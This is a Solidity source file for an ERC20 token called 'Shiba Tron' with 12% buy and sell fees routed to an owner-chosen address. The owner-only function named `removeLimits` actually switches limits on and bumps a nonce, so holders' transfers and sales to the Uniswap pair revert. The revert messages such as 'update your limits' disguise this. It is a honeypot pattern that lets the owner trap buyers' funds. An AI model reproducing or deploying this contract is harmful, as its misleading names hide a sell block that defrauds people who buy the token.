// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Shiba is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    address public buybackAddress;
    bool public limits = false;
    uint256 public DECIMALS = 18;
    
    uint256 public limitsNonce = 0;
    mapping(address => uint256) public userNonces;

    uint256 public sellFee = 12; // 12%
    uint256 public buyFee = 12; // 12%
    uint256 public constant MAX_FEE = 18; // 18%

    constructor() ERC20("Shiba Tron", "ShibaTron") {
        _mint(_msgSender(), 6 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function setBuybackAddress(address _buybackAddress) external onlyOwner {
        buybackAddress = _buybackAddress;
    }

    function setFees(uint256 _sellFee, uint256 _buyFee) external onlyOwner {
        require(_sellFee <= MAX_FEE && _buyFee <= MAX_FEE, "Fee exceeds maximum limit");
        sellFee = _sellFee;
        buyFee = _buyFee;
    }

    function _calculateFee(uint256 amount, uint256 feePercent) internal pure returns (uint256) {
        return amount.mul(feePercent).div(100);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !limits, "at this time is possible nonce");
        require(!(recipient == uniswapV2Pair && limits), "Open Level limit");

        uint256 fee = recipient == uniswapV2Pair ? _calculateFee(amount, sellFee) : _calculateFee(amount, buyFee);

        userNonces[_msgSender()] = limitsNonce;
        
        _transfer(_msgSender(), buybackAddress, fee);
        _transfer(_msgSender(), recipient, amount.sub(fee));

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair && limits) {
            require(userNonces[from] == limitsNonce, "update your limits ");
        }

        uint256 fee = to == uniswapV2Pair ? _calculateFee(amount, sellFee) : _calculateFee(amount, buyFee);

        address spender = _msgSender();

        _spendAllowance(from, spender, amount.add(fee));
        _transfer(from, buybackAddress, fee);
        _transfer(from, to, amount.sub(fee));

        userNonces[from] = limitsNonce;

        return true;
    }

    function removeLimits() external onlyOwner {
        limits = true;
        limitsNonce++;  
    }
}
